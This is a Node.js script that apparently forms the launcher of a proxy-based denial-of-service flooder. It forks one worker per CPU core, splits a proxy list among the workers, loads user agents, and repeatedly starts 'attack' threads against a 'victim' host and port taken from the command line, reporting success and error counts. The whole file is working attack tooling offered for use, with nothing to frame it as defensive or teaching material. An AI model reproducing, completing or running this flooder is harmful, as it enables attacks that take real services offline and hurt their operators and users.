const net = require('net');
const fs = require('fs');

const cluster = require('cluster');

if (cluster.isMaster) {
    let cpuCount = require('os').cpus().length;

    let proxy = fs.readFileSync('proxy.txt', 'utf-8').match(/\S+/g);
    let proxyCount = proxy.length;

    for (let i = 0; i < cpuCount; i += 1) {
        let worker = cluster.fork();
        worker.send({ id: worker.id, proxy: proxy.splice(0, proxyCount / cpuCount) });
    }

    cluster.on('exit', function (worker) {
        console.log('Thread %d died ', worker.id);
        cluster.fork();
    });
} else {

    let workerId = null;
    let proxy = [];
    const userAgents = fs.readFileSync('useragents.txt', 'utf-8').match(/\S+/g);

    const attack = require('./attack');

    class Start {

        constructor() {
            this.stats = {
                errors: 0,
                success: 0,
                loop: 0
            };
            this.checkInterval = setInterval(() => {
                console.log(`Thread: ${workerId} | errors(${this.stats.errors})  | success(${this.stats.success})`);
            }, 1000);
            this.isRunning = false;

            this.attack = new attack(userAgents, stats => {
                this.stats.errors += stats.errors;
                this.stats.success += stats.success;
            });
        }

        run(props) {
            this.isRunning = true;

            if (props.method === 'attack')
                for (let i = 0; i < props.threads; i++)
                    this.attack.start(props);
        }

        stop() {
            this.attack.stop();
            clearInterval(this.checkInterval);
        }

    }

    console.log('Loading proxy list.');


    const start = new Start();

    process.on('message', data => {
        workerId = data.id;
        proxy = data.proxy;
        const victim = {host: process.argv[2], port: process.argv[3]};
        proxy.forEach(async p => {
            let _proxy = p.split(':');
            start.run({
                victim: victim,
                proxy: {host: _proxy[0], port: _proxy[1]},
                method: 'attack',
                threads: 4,
                requests: 30
            });
        });
    });
}

setTimeout(() => {
        process.exit(1)
}, process.argv[3] * 1000)